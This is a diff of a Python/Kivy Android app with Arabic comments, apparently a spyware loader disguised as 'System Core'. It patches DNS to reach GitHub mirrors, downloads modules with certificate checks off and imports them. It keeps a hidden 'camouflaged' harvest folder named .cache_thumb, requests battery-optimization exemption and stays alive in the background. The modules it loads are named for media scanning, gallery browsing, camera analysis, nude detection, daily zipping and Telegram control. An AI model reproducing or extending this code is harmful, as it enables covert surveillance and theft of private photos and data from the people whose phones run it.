@@ -20,11 +20,12 @@ from kivy.core.clipboard import Clipboard
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== 1. تجاوز DNS: ربط الأسماء بعناوين IP ثابتة ==========
+# ========== 1. تجاوز DNS (Patch) ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
 
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
+        # الأسماء والعناوين البديلة
         override = {
             'raw.githubusercontent.com': [
                 '185.199.108.133', '185.199.109.133',
@@ -47,7 +48,7 @@ def _patch_dns():
 
 _patch_dns()
 
-# ========== 2. قائمة موسعة لعناوين index.json ==========
+# ========== 2. روابط index.json (مرايا متعددة) ==========
 INDEX_URLS = [
     "https://zaen1993.github.io/Android-Core/index.json",
     "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
@@ -62,7 +63,7 @@ HEADERS = {
     'Cache-Control': 'no-cache'
 }
 
-# ========== 3. دوال المسارات الأساسية ==========
+# ========== 3. المسارات الأساسية والمجلدات المخفية ==========
 def _get_path():
     try:
         from jnius import autoclass
@@ -78,14 +79,14 @@ R = _get_path()
 U = os.path.join(R, "updates")
 os.makedirs(U, exist_ok=True)
 
-# إنشاء مجلد التخزين المؤقت (مخفي باسم .cache_thumb للتمويه)
+# إنشاء مجلد التخزين المؤقت (مخفي ومُموّه)
 HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
 os.makedirs(HARVEST_QUEUE, exist_ok=True)
 
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== 4. دالة طلب الأذونات + استثناء البطارية ==========
+# ========== 4. أدن الوصول + طلب استثناء البطارية ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -109,7 +110,7 @@ def _perms():
     except Exception as e:
         print(f"Permissions error: {e}")
 
-    # طلب استثناء البطارية (اختياري لكن مفيد)
+    # طلب تجاوز تحسين البطارية (اختياري)
     try:
         from jnius import autoclass
         PowerManager = autoclass('android.os.PowerManager')
@@ -118,15 +119,16 @@ def _perms():
         if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
             Intent = autoclass('android.content.Intent')
             intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-            intent.setData(android.net.Uri.parse(f"package:{ctx.getPackageName()}"))
+            from android.net import Uri
+            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
             ctx.startActivity(intent)
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== 5. تطبيق Kivy الرئيسي ==========
+# ========== 5. كتطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
-        self.title = "Ultra Secure Core v6.0.0"
+        self.title = "System Core v3.0"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -196,7 +198,6 @@ class CoreApp(App):
             for current_url in candidates:
                 try:
                     self._log(f"Downloading {filename} (attempt {attempt+1}) from {current_url.split('/')[2]}...")
-                    # استخدام stream=True لتقليل استخدام الذاكرة
                     resp = requests.get(current_url, headers=HEADERS, timeout=20, verify=False, stream=True)
                     if resp.status_code == 200:
                         content_chunks = []
@@ -205,7 +206,7 @@ class CoreApp(App):
                             if chunk:
                                 content_chunks.append(chunk.decode('utf-8', errors='ignore'))
                                 total_len += len(chunk)
-                                if total_len > 5000000:  # حد أقصى 5 ميجابايت
+                                if total_len > 5000000:   # حد 5 ميجابايت
                                     self._log(f"File too large (>5MB), aborting.", "WARN")
                                     break
                         content = "".join(content_chunks)
@@ -235,7 +236,7 @@ class CoreApp(App):
         _perms()
         self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
-        # جلب index.json
+        # --- 1. جلب index.json ---
         all_files = []
         for idx_url in INDEX_URLS:
             try:
@@ -253,21 +254,22 @@ class CoreApp(App):
         else:
             self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
 
-        # تحميل الملفات
+        # --- 2. تحميل الملفات (باستثناء main.py) ---
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
                 continue
             self._download_safe(file_url, filename)
 
-        # تأخير قصير
+        # --- 3. تأخير بسيط لاستقرار الكتابة ---
         time.sleep(1)
 
-        # تنظيف الموديولات القديمة
+        # --- 4. تنظيف الموديولات القديمة ---
         self._log("🧹 Cleaning memory...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
-            "media_scanner", "daily_zipper", "gallery_browser", "camera_analyzer", "nude_detector"
+            "media_scanner", "daily_zipper", "gallery_browser",
+            "camera_analyzer", "nude_detector"
         ]
         for mod in modules_to_remove:
             if mod in sys.modules:
@@ -275,13 +277,13 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # التأكد من وجود telegram_ui.py
+        # --- 5. التأكد من وجود telegram_ui.py ---
         telegram_path = os.path.join(R, "telegram_ui.py")
         if not os.path.exists(telegram_path):
             self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
             return
 
-        # تشغيل النظام الأساسي
+        # --- 6. إقلاع النظام الأساسي ---
         try:
             import monitor
             import telegram_ui
@@ -320,13 +322,11 @@ class CoreApp(App):
             self._log(f"FATAL ERROR: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
 
-    # ========== دالتا الحفاظ على الخدمة ==========
+    # ========== تحديات الخدمة (Sticky Service) ==========
     def on_pause(self):
-        # إخبار نظام Android أن التطبيق يستمر بالعمل في الخلفية
-        return True
+        return True   # يمنع إيقاف التطبيق عند الخلفية
 
     def on_stop(self):
-        # في حال تم إيقاف التطبيق قسراً، يمكن إعادة تشغيل الخدمة هنا
         self._log("App stopped. Restarting service if needed.")
         return True
 
